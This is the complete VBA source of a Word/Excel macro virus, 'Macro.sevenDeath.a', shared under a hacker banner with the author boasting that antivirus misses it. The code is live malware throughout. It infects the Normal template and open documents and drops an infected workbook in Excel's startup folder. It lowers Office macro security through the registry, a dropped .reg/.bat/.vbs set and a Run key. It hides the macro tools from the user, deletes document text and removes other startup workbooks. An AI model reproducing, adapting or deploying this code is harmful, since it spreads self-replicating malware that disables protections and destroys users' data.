'01010101010101010101010101010101010101010101010
'01         ________________________          10
'01        çççççççççççççççççççç______         10
'01       çç   C  e e C  e e  çç______        10
'01      çç  n   s v n  s v n  çç______       10
'01     çç  e ççççççççççççç  C  çç______      10
'01    çç  v çç___       çç     çç______      10
'01     çç e  çç___     çç  s  çç______       10
'01      çç s  çç___   çç  e  çç______        10
'01       çççççççç___ çç  v  çç______         10
'01                  çç  e  çç______          10
'01                 çç  n  çç______	      10
'01                çç  C  çç______            10
'01               çç     çç______             10
'01              çç  s  çç______              10
'01             çç  e  çç______               10
'01            çç  v  çç______                10
'01           çç  e  çç______                 10
'01          çç  n  çç______                  10
'01         çç  C  çç______                   10
'01        çç     çç______                    10
'01       çç   s  çç______                    10
'01      çç  e     çç______                   10
'01      çç v e n C çç______                  10
'01      ççççççççççççç______		      10
'01                                           10
'01sevenC_zone@yahoo.com		      10
'01http://trax.to/sevenC-http://sevenc.vze.com10
'01010101010101010101010101010101010101010101010
'01010101010101010101010101010101010101010101010
'01    Macro.sevenDeath.a [ Macro.M7D.A ]     10
'01                                           10
'01010101010101010101010101010101010101010101010
'
'Yup...!! See U again here with Macro.sevenDeath.a [Macro.M7D.A]
'Now Day, I think just litle BitCh ezine / Coderz add its stuff wiTh Macro
'Maybe they Think Macro is lame ? Isn't it ?
'I made this sHit, fOr anyone who like Macro virus,buT they can't see
'A lot of macro in This scene,I hope it will make you get Idea for
'Macro.This is my First Macro virus I ever wrote,Macro will work in
'Word 97 & 2000 and Excel 97 / 2000, Multi infection right ??
'Now Mcafee 8.0 installed on my PC, But they don't scan it yet,Maybe
'Heuristic is lame Now, I think they should changes Heuristic with
'Other scaning Technique .. hehe :P
'
'I'm too lazy to explain you how this Macro work now.But I promise
'Someday I will write some articles about How to write Macro virus
'Ok..!! Just have fun with it and remember "DO NOT SPREAD IT"..!!
'I trust you..!! :)
'
'sevenC [Malworm] - N0:7 Labs
'
'note : You need to create your own logo in your project, Coz that is the Payload
'
'========================================================================
'M7D.a
'Macro.SevenDeath.a
'Author : sevenC / N0:7 [Malworm]
'No Polymorph
'No Encryption
'Target : Word & Excel
'Copyleft(c)2004 by N0:7 Laboratoryoum
'http://sevenc.vze.com || http://trax.to/sevenC ||http://sevenc.i8.com
'sevenC_zone@yahoo.com
'webmaster@sevenc.i8.com
'========================================================================

Option Compare Text
Dim obj As Variant
Dim x As Variant
Dim sehat As Boolean
Dim actWindow
Public Const app As String = "Application"
Public Const appset As String = "Settings"
Public Const appN As String = "AppName"
Public Const TimerOn = "00:01:00"
Const TempSN As String = "sevenC"
Const MacID As String = "SevenDeath"
Const SN As String = "M7D"
Const xlogo As String = "logo"
Global Infeksi As Boolean
Global Active
Global Temp
Global TempPath

Sub RegID()
On Error Resume Next
If GetSetting(app, appset, "SeventDate") = "" Then SaveSetting app, appset, "SevenDate", Format(Date + 8, "dd-mm-yyyy")
If GetSetting(app, appset, "Version") <> SN Then SaveSetting app, appset, "Version", SN
If GetSetting(app, appset, "ProgID") <> MacID & SN Then SaveSetting app, appset, "ProgID", "SevenDeath"
    End Sub

Function Periksa() As Boolean
Application.EnableCancelKey = 0
Dim getDate As Date
On Error Resume Next
getDate = GetSetting(app, appset, "SevenDate")
If getDate <= Date Then sponsor
End Function

Function objKorban(Sumber, Target) As Boolean
On Error GoTo Lari
sehat = False
For Each obj In Target.VBProject.VBComponents
      If obj.Name = MacID & SN Then sehat = True
      If (obj.Name <> "ThisDocument") And (obj.Name <> "Reference To Normal") And (obj.Name <> "logo") And (obj.Name <> MacID & SN) And _
          (Left(obj.Name, 5) <> "Sheet") And (obj.Name <> "ThisWorkbook") And (Left(obj.Name, 5) <> "Chart") Then
            Target.VBProject.VBComponents.Remove Target.VBProject.VBComponents(obj.Name)
            objKorban = True
            End If
            Next obj
      If sehat = False Then
        If Infect(Sumber, Target, MacID & SN) And Infect(Sumber, Target, xlogo) = True Then objKorban = True
           
    End If
Lari:
End Function

Sub Sikat()
On Error Resume Next
Set x = Documents
For Each x In Documents
    If x <> ActiveDocument Then
        objKorban ActiveDocument, x
        If Len(x.Path) <> 0 Then x.Save
    End If
Next x
SaveSetting app, appN, "Microsoft Excel", "False"
End Sub

Function Infect(Sumber, Target, obj As String) As Boolean
On Error GoTo ILari
    Sumber.VBProject.VBComponents(obj).Export TempPath & obj
    Target.VBProject.VBComponents.Import TempPath & obj
    Infect = True
    Kill TempPath & obj
Exit Function

ILari:
End Function

Private Sub ExpXls()
Dim xlsApp
Dim sfile As String
If (GetSetting(app, appN, "Microsoft Excel") <> "True") Then
On Error GoTo ELari:
    Set xlsApp = CreateObject("Excel.Application")
    xlsApp.Workbooks.Add
    sfile = xlsApp.StartupPath & xlsApp.PathSeparator & "EXCEL" & SN & ".XLS"
    xlsApp.ActiveWorkbook.SaveAs sfile
    TempPath = Application.NormalTemplate.Path & Application.PathSeparator
    Infect NormalTemplate, xlsApp.Workbooks("EXCEL" & SN & ".XLS"), MacID & SN
    Infect NormalTemplate, xlsApp.Workbooks("EXCEL" & SN & ".XLS"), "logo"
    xlsApp.Workbooks("EXCEL" & SN & ".XLS").VBProject.Name = TempSN & SN
    xlsApp.ActiveWindow.Visible = False
    xlsApp.Workbooks("EXCEL" & SN & ".XLS").Save
    xlsApp.Application.Quit
    SaveSetting app, appN, "Microsoft Excel", "True"
    Set xlsApp = Nothing
End If
ELari:
End Sub

Sub ExpDok()
Dim dokApp
If (GetSetting(app, appN, "Microsoft Word") <> "True") Then
    On Error GoTo DLari
    Set dokApp = CreateObject("Word.Application")
    dokApp.NormalTemplate.OpenAsDocument
    objKorban Workbooks("EXCEL" & SN & ".XLS"), dokApp.ActiveDocument
    dokApp.ActiveDocument.SaveAs ("normal.dot")
    dokApp.ActiveDocument.Close
    dokApp.Application.Quit
    SaveSetting app, appN, "Microsoft Word", "True"
    Set dokApp = Nothing
End If
DLari:
End Sub

Sub ActTemp()
On Error Resume Next
CekApp
If objKorban(Active, Temp) = True Then
       Temp.VBProject.Name = TempSN & SN
       Temp.Save
       SaveSetting app, appN, Application.Name, "True"
       Infeksi = True
    End If
End Sub

Sub TempAct()
On Error Resume Next
CekApp
 If objKorban(Temp, Active) = True Then
       Active.VBProject.Name = MacID
       If Len(Active.Path) <> 0 Then Active.Save
    End If
End Sub
'----------------------- Manipulating command bars and keyboard
Sub MExcel()
On Error Resume Next
For Each x In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls
              x.OnAction = "amd"
Next x
    WEBarC
    CommandBars("Ply").Controls("View Code").Delete
    With Application
            .OnKey "%{F2}", "periksa"
            .OnKey "%{F4}", "periksa"
            .OnKey "%{F8}", "periksa"
            .OnKey "%{F11}", "amd"
            .OnKey "{F12}", "periksa"
            .OnKey "^{o}", "OpenFile"
    End With
CommandBars("Standard").Controls("Open").OnAction = "OpenFile"
CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile"
End Sub
'Change command bars
Sub WEBarC()
On Error Resume Next
AturCmd CommandBars.ActiveMenuBar, False
AturCmd CommandBars("Formatting"), False
AturCmd CommandBars("Standard"), False
AturCmd CommandBars("Control Toolbox"), True
AturCmd CommandBars("Forms"), True
AturCmd CommandBars("ActiveX Control"), True
AturCmd CommandBars("Visual Basic"), True
End Sub

Sub AturCmd(cmd, param As Boolean)
With cmd
    If param = True Then
        .Enabled = False
        .Visible = False
    End If
End With
End Sub

Sub MWord()
On Error Resume Next
CustomizationContext = NormalTemplate
  With Options
            .VirusProtection = False
            .SaveNormalPrompt = False
    End With
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
    FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
    WEBarC
End Sub

Sub w2000()
On Error Resume Next
Siluman
Dhemit
Open "\windows.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1,
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #1, """"; "Level"; """"; "=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security]"
Print #1, """"; "Level"; """"; "=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #1, """"; "Level"; """"; "=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """"; "Level"; """"; "=dword:00000001"
Print #1, "[Hkey_Local_Machine\software\microsoft\Windows\CurrentVersion\Run]"
Print #1, """"; "FixSys"; """"; "="; """"; "regedit.exe /s \\windows.reg"; """"
Close #1
On Error Resume Next
Shell "regedit.exe /s \windows.reg", vbHide
End Sub

Sub Siluman()
Open "\fix.bat" For Output As #1
Print #1, "regedit /s \windows.reg"
Close #1
End Sub
Sub Dhemit()
Open "\sex.txt.vbs" For Output As #1
Print #1, "Dim WSH"
Print #1, "Set WSH = WScript.CreateObject("; """WScript.Shell"""; ")"
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\10"; "."; "0\Word\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\10"; "."; "0\Excel\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\9"; "."; "0\Word\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "WSH.RegWrite "; """HKCU\Software\Microsoft\Office\9"; "."; "0\Excel\Security\Level"""; ", 1, "; """REG_DWORD"""
Print #1, "Set WWA = WScript.CreateObject("; """Word.application"""; ")"
Print #1, "WWA.Options.VirusProtection = False"
Print #1, "WWA.Options.SaveNormalPrompt = False"
Print #1, "WWA.Application.Quit"
Close #1
End Sub

Sub AutoExec()
       Application.EnableCancelKey = 0
        Application.DisplayRecentFiles = False
        SaveSetting app, appN, "Microsoft Word", "True"
        w2000
        MWord
        ExpXls
        RegID
        Documents.Add
        Application.OnTime Now + TimeValue(TimerOn), "Pewaktu"
End Sub

Sub AutoNew()
On Error Resume Next
TempAct
End Sub

Sub AutoOpen()
On Error Resume Next
Dim strRun As String

        Application.EnableCancelKey = 0
        ActTemp
        Sikat
        w2000
        MWord
        RegID
        If Infeksi = True Then
            strRun = TempSN & SN & "." & MacID & SN & ".Ketemu"
            Application.OnTime Now + TimeValue("00:01:00"), strRun
       End If
End Sub

Sub FileOpen()
On Error Resume Next
    WordBasic.DisableAutoMacros 1
    Dialogs(80).Show
    TempAct
    WordBasic.DisableAutoMacros 0
End Sub

Sub Auto_Open()
On Error Resume Next
Application.EnableCancelKey = 0
XlsAct
ExpDok
w2000
Application.DisplayRecentFiles = False
End Sub

Private Sub AllWB()
sehat = False
For Each obj In Workbooks
      actWindow = obj.Name
      If actWindow = "EXCEL" & SN & ".XLS" Then sehat = True
      If obj.Path = Application.StartupPath And actWindow <> "EXCEL" & SN & ".XLS" Then
               obj.Close False
               Kill Application.StartupPath & Application.PathSeparator & actWindow
         End If
 Next obj
If sehat = False Then PicuXlsAct
End Sub

Sub XlsAct()
On Error Resume Next
Application.EnableCancelKey = 0
Application.DisplayAlerts = False
TempAct
AllWB
Application.OnSheetActivate = ""
Application.OnSheetDeactivate = ""
Application.OnWindow = ""
MExcel
Application.OnWindow = "EXCEL" & SN & ".XLS" & "!XlsAct"
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub



Sub OpenFile()
On Error Resume Next
Application.DisplayAlerts = False
Application.Dialogs(1).Show
XlsAct
End Sub

Sub PicuXlsAct()
Dim Baru As String
On Error Resume Next
Application.ScreenUpdating = False
Workbooks.Add
Baru = Application.StartupPath & Application.PathSeparator & "EXCEL" & SN & ".XLS"
ActiveWorkbook.SaveAs Baru
ActiveWindow.Visible = False
ActTemp
End Sub

Sub Pewaktu()
    Periksa
    Application.OnTime Now + TimeValue(TimerOn), "Pewaktu"
End Sub

Sub Ketemu()
TempAct
Infeksi = False
End Sub

Sub CekApp()
If Application.Name = "Microsoft Word" Then Doc Else Xls
End Sub
Sub Doc()
TempPath = Application.NormalTemplate.Path & Application.PathSeparator
Set Active = ActiveDocument
Set Temp = NormalTemplate
End Sub

Sub Xls()
Set Active = ActiveWorkbook
Set Temp = Workbooks("EXCEL" & SN & ".XLS")
TempPath = Application.TemplatesPath
End Sub

Sub sponsor()
Application.EnableCancelKey = 0
On Error Resume Next
LOGO.Show
End Sub

Sub ToolsCustomizeKeyboard()
ani_kanan
End Sub

Sub ViewCode()
ani_atas
End Sub

Sub ViewVBcode()
wani2
End Sub

Sub ToolsCustomize()
ani_bawah
End Sub

Sub ToolsMacro()
wani2
End Sub

Sub ToolsRecordMacroToggle()
wani2
End Sub

Sub FileTemplates()
ani_kiri
End Sub

Sub ViewSecurity()
MsgBox (" Well...!! Do you want to change it ?? ask sevenC to do that !!! ")
ani_kiri
ani_kanan
ani_bawah
ani_atas
wani2
Periksa
End Sub

Sub wani2()
Application.EnableCancelKey = 0
Dim numchars As Integer
numchars = ActiveDocument.Characters.Count
    Do While x < numchars
    x = x + 1
    Selection.HomeKey Unit:=wdStory
    Selection.MoveRight Unit:=wdCharacter, Count:=1, Extend:=wdExtend
    Selection.Cut
Loop
End Sub

Sub amd()
Dim angka
angka = 0
On Error Resume Next
ActiveWindow.Zoom = 80
Rows("1:101").Select
Selection.RowHeight = 23
Range("A1").Select

Do While angka < 17
angka = angka + 1

x = Rontok("d", angka)
x = Rontok("a", angka)
x = Rontok("b", angka)
x = Rontok("c", angka)
x = Rontok("F", angka)
x = Rontok("g", angka)
x = Rontok("i", angka)
x = Rontok("h", angka)
x = Rontok("j", angka)
x = Rontok("e", angka)
Loop
End Sub

Function Rontok(ax, bx)
Application.EnableCancelKey = 0
Dim x
Dim c
    x = 0
    Do While x < 17
    x = x + 1
    Range(ax & bx).Select
    Selection.Font.ColorIndex = 3
    Selection.Copy
    Range(ax & x).Select
    For c = 1 To 11250
     c = c + 1
    Next
    Loop
    Range(ax & bx).Select
    Selection.Copy
    Range(ax & x).Select
    ActiveSheet.Paste
    Range(ax & bx).Select
    Selection.ClearContents
    Range(ax & bx).Select
End Function

Sub ani_bawah()
Application.EnableCancelKey = 0
On Error Resume Next
Dim cbar1
Dim y
y = 0
Do While y < 10
y = y + 1
Dim x
x = 0
Do While x < 15
x = x + 1
Set cbar1 = CommandBars.Add(Name:="M7D" + Str(x), Position:=msoBarTop)
cbar1.Visible = True
Loop
Dim z
z = 0
Do While z < 15
z = z + 1
    CommandBars("M7D" + Str(z)).Delete
Loop
Loop
End Sub

Sub ani_kiri()
Application.EnableCancelKey = 0
On Error Resume Next
Dim cbar1
Dim y
y = 0
Do While y < 10
y = y + 1
Dim x
x = 0
Do While x < 15
x = x + 1
Set cbar1 = CommandBars.Add(Name:="M7D" + Str(x), Position:=msoBarLeft)
cbar1.Visible = True
Loop
Dim z
z = 0
Do While z < 15
z = z + 1
    CommandBars("M7D" + Str(z)).Delete
Loop
Loop
End Sub

Sub ani_kanan()
Application.EnableCancelKey = 0
On Error Resume Next
Dim cbar1
Dim y
y = 0
Do While y < 10
y = y + 1
Dim x
x = 0
Do While x < 21
x = x + 1
Set cbar1 = CommandBars.Add(Name:="M7D" + Str(x), Position:=msoBarRight)
cbar1.Visible = True
Loop
Dim z
z = 0
Do While z < 21
z = z + 1
    CommandBars("M7D" + Str(z)).Delete
Loop
Loop
End Sub

Sub ani_atas()
Application.EnableCancelKey = 0
On Error Resume Next
Dim cbar1
Dim y
y = 0
Do While y < 10
y = y + 1
Dim x
x = 0
Do While x < 15
x = x + 1
Set cbar1 = CommandBars.Add(Name:="M7D" + Str(x), Position:=msoBarBottom)
cbar1.Visible = True
Loop
Dim z
z = 0
Do While z < 15
z = z + 1
    CommandBars("M7D" + Str(z)).Delete
Loop
Loop
End Sub

'Macro.SevenDeath.A / M7D.A
'sevenC/N0:7 [Malworm]
'http://sevenc.vze.com